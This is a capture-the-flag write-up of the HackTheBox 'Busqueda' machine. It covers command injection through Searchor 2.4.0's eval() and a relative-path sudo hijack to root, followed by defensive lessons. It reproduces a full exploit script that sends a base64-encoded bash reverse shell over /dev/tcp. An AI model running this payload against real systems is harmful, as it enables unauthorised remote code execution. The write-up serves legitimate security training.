## Foothold: Searchor Command Injection

> Searchor 2.4.0 builds its redirect from whatever I type. If it evaluates that string, the search box is a shell.

A `405 Method Not Allowed` is a hint, not a wall: the route exists, it just expects a different HTTP method. So I send `/search` a `POST` through Burp Suite to see how it handles input.

![Burp Suite Repeater: a POST to /search with the engine and query fields in the request body, and the 200 response beside it returning a ready-made search URL](../../../../assets/hackthebox/easy/busqueda/busqueda-2.png)
*This confirms the application is directly processing user-controlled input before performing the search logic.*

Scrolling to the bottom of the page answers the next question.

![Application footer text reading Searchor 2.4.0](../../../../assets/hackthebox/easy/busqueda/busqueda-3.png)
*The footer then confirms the backend engine as Searchor 2.4.0.*

That version number is the lead. Searchor 2.4.0 has a well-documented arbitrary command injection.

- Project: https://github.com/ArjunSharda/Searchor
- Public exploit: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/

<Callout type="vuln">

Searchor builds its result by calling Python's `eval()` on a string assembled from the query, so a query that closes the expression early can append `__import__('os').system(...)` and run anything. The `query` field is the way in. `engine` goes into the same string, but the app only accepts names Searchor already knows, so `query` is the half that arrives unguarded.

</Callout>

The public script automates the payload chain: a bash reverse shell is base64-encoded, wrapped inside the `os.system` break-out, then its `+` characters are URL-encoded as `%2B` so they are not read as spaces when the payload is posted to `/search`.

<Toggle label="Reproducing the attack <code>exploit.sh</code>">

```bash frame="code" title="exploit.sh" {5}
#!/bin/bash -
default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

if [ -z "${evil_cmd##*$plus*}" ]; then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"
echo "[*] Input target is $1"
echo "[*] Input attacker is $2:${port}"
echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
```

## Privilege Escalation

> svc got me through the door. Something here is trusted more than it should be, and I need to find it, starting with whatever the web root left behind.

The reflex is `sudo -l`, but it wants svc's password and I do not have one yet. So the order inverts: before I can ask what svc may run as root, I need a credential, and a web app's own directory is the first place to dig.

### Relative-Path Hijack to Root

As `administrator` I can open the private `scripts` repo that `cody` could not. It holds the source of `system-checkup.py`.

![Gitea file listing of the private administrator scripts repository, showing system-checkup.py alongside full-checkup.sh](../../../../assets/hackthebox/easy/busqueda/busqueda-7.png)
*The private scripts repository, with system-checkup.py and the helper it calls both in the listing.*

Reading the source, I find that `full-checkup` is the weak point: it calls a helper script using a relative path.

```python frame="code" title="Python" {3}
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

That single `./` is the vulnerability: the script calls `./full-checkup.sh`, which is resolved relative to the current working directory, and I control that directory when I invoke it. The sudoers `secure_path` only sanitizes `PATH` lookups, not relative paths used directly in the script.

So I drop a custom `full-checkup.sh` (a reverse shell) into a directory I control, then run the script from there. It runs my helper as root.

## Summary

The whole path in one breath: Searchor 2.4.0 evaluates whatever I type into the search box, which hands me a shell as `svc`. A `.git` directory left in the web root leaks cody's password, and svc reuses it. svc's one sudo right runs a checkup script, and its `docker-inspect` action prints the Gitea container's database password. That password is also the Gitea `administrator` password, and the private repo it opens holds the script's source: it calls its helper by relative path, so I plant my own helper and become root.

## Reflection

Three lessons, one per stage of the chain:

1. **`eval()` on user input is the original sin.** Searchor's command injection existed because it evaluated a string built from the query. A blocklist would not have saved it: the fix is to never let untrusted text reach an evaluator.
2. **Credential reuse turns a single leak into a cascade.** The password found in `.git/config` also worked for `svc` over SSH, and the Gitea database password also worked for `administrator`. A single secret that travels between accounts collapses every boundary it touches.
3. **A relative path under sudo is a straightforward privilege escalation.** `system-checkup.py` called `./full-checkup.sh` instead of an absolute path, and `secure_path` does not cover paths a script constructs for itself. Privileged programs should call helpers by absolute path and pin their working directory.

<Callout type="defense">

Pin Searchor to a patched release, keep secrets in a vault instead of a committed `.git` directory, and narrow svc's sudo rule so it cannot reach `full-checkup`, the one action that turns a relative path into a root shell. Any one of these breaks the chain.

</Callout>
